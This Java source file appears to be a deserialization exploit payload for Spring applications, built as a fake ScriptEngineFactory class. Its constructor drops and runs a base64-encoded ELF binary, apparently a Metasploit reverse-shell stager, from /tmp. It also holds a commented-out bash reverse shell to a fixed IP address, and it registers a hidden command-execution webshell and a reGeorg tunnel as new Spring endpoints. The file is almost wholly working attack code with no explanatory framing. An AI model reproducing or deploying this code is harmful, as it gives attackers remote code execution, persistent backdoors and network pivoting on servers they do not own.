package artsploit;

import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.lang.reflect.Method;
import java.util.List;

public class AwesomeScriptEngineFactory implements ScriptEngineFactory {
    public AwesomeScriptEngineFactory() {
        try {
			System.out.println("start-get-context");
			getMsfShell();
			//Runtime.getRuntime().exec(new String[]{"bash","-c","bash -i >& /dev/tcp/172.29.137.54/1234 0>&1"});
            //WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();
            //WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());
            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);
            System.out.println("start-inject-webshell");
            // 注册执行命令的shell
            Method method = (Class.forName("artsploit.GameInfo").getDeclaredMethods())[0];
            PatternsRequestCondition url = new PatternsRequestCondition("/api/v1/_info");
            RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
            RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
            r.registerMapping(info, Class.forName("artsploit.GameInfo").newInstance(), method);
            System.out.println("start-inject-tunnel");
            // 注册reGeorg tunnel
            Method method1 = (Class.forName("artsploit.Tunnel").getDeclaredMethods())[0];
            PatternsRequestCondition url1 = new PatternsRequestCondition("/api/v1/tunnel");
            RequestMethodsRequestCondition ms1 = new RequestMethodsRequestCondition();
            RequestMappingInfo info1 = new RequestMappingInfo(url1, ms1, null, null, null, null, null);
            r.registerMapping(info1, Class.forName("artsploit.Tunnel").newInstance(), method1);

        } catch (Exception e) {
            //System.out.println();
			System.out.println("Error<<<<<"+e.getMessage());
            //e.printStackTrace();
        }
    }
	public void getMsfShell(){
		try {
			Runtime.getRuntime().exec(new String[]{"bash","-c","echo 'f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAA+gAAAAAAAAB8AQAAAAAAAAAQAAAAAAAASDH/aglYmbYQSInWTTHJaiJBWrIHDwVIhcB4UWoKQVlQailYmWoCX2oBXg8FSIXAeDtIl0i5AgAFIns8CxlRSInmahBaaipYDwVZSIXAeSVJ/8l0GFdqI1hqAGoFSInnSDH2DwVZWV9IhcB5x2o8WGoBXw8FXmp+Wg8FSIXAeO3/5g=='|base64 -d>/tmp/1.elf&&chmod +x /tmp/1.elf&&/tmp/1.elf"});
		} catch (Exception e){
			System.out.println("msf_exec_error");
		}
	}

    public String getEngineName() {
        return null;
    }

    public String getEngineVersion() {
        return null;
    }

    public List<String> getExtensions() {
        return null;
    }

    public List<String> getMimeTypes() {
        return null;
    }

    public List<String> getNames() {
        return null;
    }

    public String getLanguageName() {
        return null;
    }

    public String getLanguageVersion() {
        return null;
    }

    public Object getParameter(String key) {
        return null;
    }

    public String getMethodCallSyntax(String obj, String m, String... args) {
        return null;
    }

    public String getOutputStatement(String toDisplay) {
        return null;
    }

    public String getProgram(String... statements) {
        return null;
    }

    public ScriptEngine getScriptEngine() {
        return null;
    }
}
